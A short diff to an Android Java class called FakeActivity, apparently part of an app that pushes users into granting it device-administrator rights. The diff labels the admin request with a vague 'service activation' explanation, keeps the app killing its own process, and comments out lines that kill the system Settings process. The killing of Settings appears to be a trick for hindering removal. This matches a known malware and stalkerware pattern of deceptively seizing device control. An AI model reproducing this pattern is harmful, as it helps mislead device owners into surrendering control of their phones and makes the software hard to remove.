@@ -34,8 +34,8 @@ public class FakeActivity extends Activity {
             mHandler.postDelayed(new Runnable() {
                 @Override
                 public void run() {
-                    ActivityManager activityManager = (ActivityManager) getSystemService(Context.ACTIVITY_SERVICE);
-                    activityManager.killBackgroundProcesses("com.android.settings");
+//                    ActivityManager activityManager = (ActivityManager) getSystemService(Context.ACTIVITY_SERVICE);
+//                    activityManager.killBackgroundProcesses("com.android.settings");
                     android.os.Process.killProcess(android.os.Process.myPid());
                 }
             }, 500);
@@ -54,7 +54,7 @@ public class FakeActivity extends Activity {
         //start device binding
         Intent i = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
         i.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, new ComponentName(getApplicationContext(), DeviceBindBRC.class));
-        i.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "（自定义区域2）");
+        i.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "服务激活");
         i.setFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP | Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS);
         startActivityForResult(i, 1000);
 
@@ -76,8 +76,8 @@ public class FakeActivity extends Activity {
                             public void run() {
                                 Config.LOGD("[[FakeActivity::postDelayed]] try to finish process >>>>>>>");
 
-                                ActivityManager activityManager = (ActivityManager) getSystemService(Context.ACTIVITY_SERVICE);
-                                activityManager.killBackgroundProcesses("com.android.settings");
+//                                ActivityManager activityManager = (ActivityManager) getSystemService(Context.ACTIVITY_SERVICE);
+//                                activityManager.killBackgroundProcesses("com.android.settings");
                                 android.os.Process.killProcess(android.os.Process.myPid());
                             }
                         }, 200);
